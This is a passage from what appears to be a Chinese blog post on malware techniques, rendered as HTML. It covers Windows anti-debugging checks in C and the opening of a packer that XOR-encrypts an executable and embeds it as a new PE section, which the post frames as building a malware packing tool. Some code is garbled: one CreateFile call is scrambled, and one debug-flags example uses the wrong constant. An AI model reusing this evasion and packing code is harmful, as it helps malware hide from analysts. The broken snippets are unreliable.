class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.1IsDebuggerPresent</span><br><span class=\"line\">IsDebuggerPresent查询进程环境块(PEB)中的IsDebugged标志。如果进程没有运行在调试器环境中，函数返回0；如果调试附加了进程，函数返回一个非零值。</span><br><span class=\"line\">BOOL CheckDebug()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   return IsDebuggerPresent();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">1.2CheckRemoteDebuggerPresent</span><br><span class=\"line\">CheckRemoteDebuggerPresent同IsDebuggerPresent几乎一致。它不仅可以探测系统其他进程是否被调试，通过传递自身进程句柄还可以探测自身是否被调试。</span><br><span class=\"line\">BOOL CheckDebug()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   BOOL ret;</span><br><span class=\"line\">   CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);</span><br><span class=\"line\">   return ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">1.3NtQueryInformationProcess</span><br><span class=\"line\">这个函数是Ntdll.dll中一个原生态API，它用来提取一个给定进程的信息。它的第一个参数是进程句柄，第二个参数告诉我们它需要提取进程信息的类型。为第二个参数指定特定值并调用该函数，相关信息就会设置到第三个参数。第二个参数是一个枚举类型，其中与反调试有关的成员有ProcessDebugPort(0x7)、ProcessDebugObjectHandle(0x1E)和ProcessDebugFlags(0x1F)。例如将该参数置为ProcessDebugPort，如果进程正在被调试，则返回调试端口，否则返回0。</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CheckDebug()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   int debugPort = 0;</span><br><span class=\"line\">   HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;);</span><br><span class=\"line\">   NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);</span><br><span class=\"line\">   NtQueryInformationProcess(GetCurrentProcess(), 0x7, &amp;debugPort, sizeof(debugPort), NULL);</span><br><span class=\"line\">   return debugPort != 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CheckDebug()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   HANDLE hdebugObject = NULL;</span><br><span class=\"line\">   HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;);</span><br><span class=\"line\">   NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);</span><br><span class=\"line\">   NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;hdebugObject, sizeof(hdebugObject), NULL);</span><br><span class=\"line\">   return hdebugObject != NULL;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CheckDebug()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   BOOL bdebugFlag = TRUE;</span><br><span class=\"line\">   HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;);</span><br><span class=\"line\">   NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);</span><br><span class=\"line\">   NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;bdebugFlag, sizeof(bdebugFlag), NULL);</span><br><span class=\"line\">   return bdebugFlag != TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">1.4GetLastError</span><br><span class=\"line\">编写应用程序时，经常需要涉及到错误处理问题。许多函数调用只用TRUE和FALSE来表明函数的运行结果。一旦出现错误，MSDN中往往会指出请用GetLastError()函数来获得错误原因。恶意代码可以使用异常来破坏或者探测调试器。调试器捕获异常后，并不会立即将处理权返回被调试进程处理，大多数利用异常的反调试技术往往据此来检测调试器。多数调试器默认的设置是捕获异常后不将异常传递给应用程序。如果调试器不能将异常结果正确返回到被调试进程，那么这种异常失效可以被进程内部的异常处理机制探测。</span><br><span class=\"line\">对于OutputDebugString函数，它的作用是在调试器中显示一个字符串，同时它也可以用来探测调试器的存在。使用SetLastError函数，将当前的错误码设置为一个任意值。如果进程没有被调试器附加，调用OutputDebugString函数会失败，错误码会重新设置，因此GetLastError获取的错误码应该不是我们设置的任意值。但如果进程被调试器附加，调用OutputDebugString函数会成功，这时GetLastError获取的错误码应该没改变。</span><br><span class=\"line\">BOOL CheckDebug()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   DWORD errorValue = 12345;</span><br><span class=\"line\">   SetLastError(errorValue);</span><br><span class=\"line\">   OutputDebugString(&quot;Test for debugger!&quot;);</span><br><span class=\"line\">   if (GetLastError() == errorValue)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     return TRUE;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   else</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     return FALSE;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">对于DeleteFiber函数，如果给它传递一个无效的参数的话会抛出ERROR_INVALID_PARAMETER异常。如果进程正在被调试的话，异常会被调试器捕获。所以，同样可以通过验证LastError值来检测调试器的存在。如代码所示，0x57就是指ERROR_INVALID_PARAMETER。</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CheckDebug()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   char fib[1024] = &#123;0&#125;;</span><br><span class=\"line\">   DeleteFiber(fib);</span><br><span class=\"line\">   return (GetLastError() != 0x57);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">同样还可以使用CloseHandle、CloseWindow产生异常，使得错误码改变。</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CheckDebug()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   DWORD ret = CloseHandle((HANDLE)0x1234);</span><br><span class=\"line\">   if (ret != 0 || GetLastError() != ERROR_INVALID_HANDLE)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     return TRUE;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   else</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     return FALSE;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CheckDebug()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   DWORD ret = CloseWindow((HWND)0x1234);</span><br><span class=\"line\">   if (ret != 0 || GetLastError() != ERROR_INVALID_WINDOW_HANDLE)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     return TRUE;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   else</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     return FALSE;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">1.5ZwSetInformationThread</span><br><span class=\"line\">ZwSetInformationThread拥有两个参数，第一个参数用来接收当前线程的句柄，第二个参数表示线程信息类型，若其值设置为ThreadHideFromDebugger(0x11)，使用语句ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0);调用该函数后，调试进程就会被分离出来。该函数不会对正常运行的程序产生任何影响，但若运行的是调试器程序，因为该函数隐藏了当前线程，调试器无法再收到该线程的调试事件，最终停止调试。还有一个函数DebugActiveProcessStop用来分离调试器和被调试进程，从而停止调试。两个API容易混淆，需要牢记它们的区别。</span><br></pre></td></tr></table></figure>\n<h3 id=\"手工加壳原理\"><a class=\"markdownIt-Anchor\" href=\"#手工加壳原理\">#</a> 手工加壳原理</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231012152019892.png\" alt=\"image-20231012152019892\"></p>\n<p>我们向 PE 文件添加一个区段并将其设置为入口点，这样 PE 文件最开始执行的命令就是我们添加的区段也就是壳的指令，壳对加密区进行解密，对压缩区进行解压，将原本的 EXE 文件还原出来，然后跳转至原程序入口，程序照常运行。</p>\n<ul>\n<li><em><strong>* 恶意软件加壳工具开发原理 *</strong></em></li>\n</ul>\n<ol>\n<li>\n<p>demo.exe 代表是被加壳的源程序。</p>\n</li>\n<li>\n<p>Shell.exe 代表的是壳子程序。</p>\n</li>\n<li>\n<p>Packed.exe 代表的是加壳程序。</p>\n</li>\n<li>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;cstdio></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">SHELL_FILE_NAME</span> <span class=\"token string\">\"Shell.exe\"</span>   <span class=\"token comment\">// 壳子名</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">ORGIN_FILE_NAME</span> <span class=\"token string\">\"demo.exe\"</span>    <span class=\"token comment\">// 要被加壳的程序名称</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">TARGET_FILE_NAME</span> <span class=\"token string\">\"target.exe\"</span> <span class=\"token comment\">// 生成的文件名</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>BOOL <span class=\"token function\">PackFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 将要加壳的程序加密以后加入壳子中</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>VOID <span class=\"token function\">EncpyptFile</span><span class=\"token punctuation\">(</span>PUCHAR pBaseAddr<span class=\"token punctuation\">,</span> DWORD dwFileSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 对文件内容进行加密</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>BOOL <span class=\"token function\">AddSection</span><span class=\"token punctuation\">(</span>PVOID pShellBase<span class=\"token punctuation\">,</span> PVOID pOrgBase<span class=\"token punctuation\">,</span> DWORD dwShellFileSize<span class=\"token punctuation\">,</span> DWORD dwOrgFileSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 将源文件加到壳子中</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>VOID <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span>PCHAR msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 弹出错误信息</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>DWORD <span class=\"token function\">Align</span><span class=\"token punctuation\">(</span>DWORD dwSize<span class=\"token punctuation\">,</span> DWORD dwAlign<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 用于对齐，返回对齐以后的数字</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">int</span> APIENTRY <span class=\"token function\">wWinMain</span><span class=\"token punctuation\">(</span>_In_ HINSTANCE hInstance<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                     _In_opt_ HINSTANCE hPrevInstance<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                     _In_ LPWSTR    lpCmdLine<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                     _In_ <span class=\"token keyword\">int</span>       nCmdShow<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">PackFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token function\">MessageBox</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"加壳成功\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"成功\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MB_OK<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre> </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>BOOL <span class=\"token function\">PackFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    BOOL bRet <span class=\"token operator\">=</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    HANDLE hOrgFile <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> hShellFile <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    DWORD dwOrgFileSize <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> dwShellFileSize <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> dwRet <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> dwFileSize <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    PVOID pOrgBase <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> pShellBase <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    hOrgFile <span class=\"token operator\">=</span> CrLE_NAME<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                          <span class=\"token function\">GENERIC_eateFile</span><span class=\"token punctuation\">(</span>ORGIN_FIREAD<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                          <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                          OPEN_EXISTING<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                          FILE_ATTRIBUTE_NORMAL<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre> </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hOrgFile <span class=\"token operator\">==</span> INVALID_HANDLE_VALUE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CreateFile OrigFile\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        bRet <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">goto</span> exit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    dwOrgFileSize <span class=\"token operator\">=</span> <span class=\"token function\">GetFileSize</span><span class=\"token punctuation\">(</span>hOrgFile<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre> </pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    pOrgBase <span class=\"token operator\">=</span> <span class=\"token function\">VirtualAlloc</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> dwOrgFileSize<span class=\"token punctuation\">,</span> MEM_COMMIT <span class=\"token operator\">|</span> MEM_RESERVE<span class=\"token punctuation\">,</span> PAGE_READWRITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>pOrgBase<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"VirtualAlloc pOrgBase\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        bRet <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">goto</span> exit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre> </pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span>pOrgBase<span class=\"token punctuation\">,</span> dwOrgFileSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">ReadFile</span><span class=\"token punctuation\">(</span>hOrgFile<span class=\"token punctuation\">,</span> pOrgBase<span class=\"token punctuation\">,</span> dwOrgFileSize<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>dwRet<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ReadFile pOrgBase\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        bRet <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">goto</span> exit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre> </pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token function\">EncpyptFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>PUCHAR<span class=\"token punctuation\">)</span>pOrgBase<span class=\"token punctuation\">,</span> dwOrgFileSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 对源程序进行 XOR 加密</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre> </pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    hShellFile <span class=\"token operator\">=</span> <span class=\"token function\">CreateFile</span><span class=\"token punctuation\">(</span>SHELL_FILE_NAME<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>                GENERIC_READ<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                OPEN_EXISTING<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                FILE_ATTRIBUTE_NORMAL<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hShellFile <span class=\"token operator\">==</span> INVALID_HANDLE_VALUE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>        <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CreateFile ShellFile\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        bRet <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        <span class=\"token keyword\">goto</span> exit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    dwShellFileSize <span class=\"token operator\">=</span> <span class=\"token function\">GetFileSize</span><span class=\"token punctuation\">(</span>hShellFile<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre> </pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    pShellBase <span class=\"token operator\">=</span> <span class=\"token function\">VirtualAlloc</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> dwShellFileSize <span class=\"token operator\">+</span> dwOrgFileSize<span class=\"token punctuation\">,</span> MEM_COMMIT <span class=\"token operator\">|</span> MEM_RESERVE<span class=\"token punctuation\">,</span> PAGE_READWRITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>pShellBase<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"VirtualAlloc pShellBase\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        bRet <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        <span class=\"token keyword\">goto</span> exit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre> </pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span>pShellBase<span class=\"token punctuation\">,</span> dwShellFileSize <span class=\"token operator\">+</span> dwOrgFileSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">ReadFile</span><span class=\"token punctuation\">(</span>hShellFile<span class=\"token punctuation\">,</span> pShellBase<span class=\"token punctuation\">,</span> dwShellFileSize<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>dwRet<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>        <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ReadFile pShellBase\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>        bRet <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token keyword\">goto</span> exit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre> </pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">AddSection</span><span class=\"token punctuation\">(</span>pShellBase<span class=\"token punctuation\">,</span> pOrgBase<span class=\"token punctuation\">,</span> dwShellFileSize<span class=\"token punctuation\">,</span> dwOrgFileSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        bRet <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        <span class=\"token keyword\">goto</span> exit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>exit<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hOrgFile<span class=\"token punctuation\">)</span> <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hOrgFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hShellFile<span class=\"token punctuation\">)</span> <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hShellFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pOrgBase<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">VirtualFree</span><span class=\"token punctuation\">(</span>pOrgBase<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> MEM_DECOMMIT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"VirtualFree pOrgBase\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre> </pre></td></tr><tr><td data-num=\"113\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pShellBase<span 